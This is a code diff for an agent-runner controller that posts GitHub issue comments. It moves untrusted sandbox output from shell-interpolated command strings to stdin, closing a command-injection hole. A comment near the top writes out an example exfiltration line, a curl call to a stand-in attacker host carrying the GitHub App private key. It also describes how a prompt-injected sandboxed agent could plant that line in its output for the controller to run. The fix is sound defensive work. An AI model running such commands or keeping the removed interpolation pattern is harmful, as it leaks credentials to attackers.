@@ -51,6 +51,15 @@ function sh(cmd, opts = {}) {
 function shTry(cmd, opts = {}) {
   try { return sh(cmd, opts); } catch { return null; }
 }
+// Untrusted content (anything derived from sandbox output) MUST go via stdin, never
+// interpolated into a command string. JSON.stringify emits DOUBLE quotes, and the shell
+// expands backticks and $( ) inside those — so a prompt-injected agent could put
+// $(curl attacker/?k=$NANOBOTS_GITHUB_APP_PRIVATE_KEY) in its output and have the CONTROLLER
+// run it. The controller holds DAYTONA_API_KEY and the App private key; the sandbox must
+// never be able to reach them.
+function shStdin(cmd, input) { return execSync(cmd, { encoding: utf8, input }); }
+function shStdinTry(cmd, input) { try { return shStdin(cmd, input); } catch { return null; } }
+
 function shJson(cmd) {
   return JSON.parse(sh(cmd));
 }
@@ -192,7 +201,7 @@ function claim(number, projectNumber, statusField) {
     .items.find((it) => it.content?.number === number);
   if (!item) return false;
   const claimNote = `<!-- nanobots:run issue=${number} run=${RUN_ID} attempt=1 -->\n🤖 daytona-worker claimed this item (run \`${RUN_ID.slice(0, 8)}\`) — building in an isolated Daytona sandbox.`;
-  sh(`gh issue comment ${number} --repo ${NWO} --body ${JSON.stringify(claimNote)}`);
+  shStdin(`gh issue comment ${number} --repo ${NWO} --body-file -`, claimNote);
   sh(`gh project item-edit --project-id ${statusField.projectId} --id ${item.id} --field-id ${statusField.id} --single-select-option-id ${statusField.options['In Progress']}`);
   // Re-read: confirm our claim comment is still the most recent run marker (single-flight, best effort).
   const latest = shJson(`gh issue view ${number} --repo ${NWO} --json comments --jq '.comments'`)
@@ -342,16 +351,20 @@ async function main() {
       },
     });
 
-    sh(`gh issue comment ${target.number} --repo ${NWO} --body ${JSON.stringify(
+    // The tail is SANDBOX OUTPUT — untrusted. Via stdin, never the command string.
+    shStdin(
+      `gh issue comment ${target.number} --repo ${NWO} --body-file -`,
       `<!-- nanobots:run issue=${target.number} run=${RUN_ID} attempt=1 state=done -->\n`
-      + `🤖 sandbox run finished (exit ${build.exitCode}). Tail:\n\n\`\`\`\n${redact(build.result).slice(-3000)}\n\`\`\``,
-    )}`);
+      + `🤖 sandbox run finished (exit ${build.exitCode}). Tail:\n\n\`\`\`\n${redact(build.result ?? '').slice(-3000)}\n\`\`\``,
+    );
     if (build.exitCode !== 0) throw new Error(`worker exited ${build.exitCode} — see the issue comment for the sanitized tail`);
   } catch (err) {
     warn(`run ${RUN_ID} for #${target.number} failed: ${err.message}`);
-    shTry(`gh issue comment ${target.number} --repo ${NWO} --body ${JSON.stringify(
+    // err.message can also carry sandbox output (exec failures embed the response body).
+    shStdinTry(
+      `gh issue comment ${target.number} --repo ${NWO} --body-file -`,
       `<!-- nanobots:run issue=${target.number} run=${RUN_ID} attempt=1 state=failed -->\n🤖 sandbox run failed: ${redact(err.message)}`,
-    )}`);
+    );
   } finally {
     // Revoke BEFORE the sandbox goes away, and on every exit path including failure/abort.
     // Revocation is eventually consistent (~2–7s observed): this narrows the window, it does
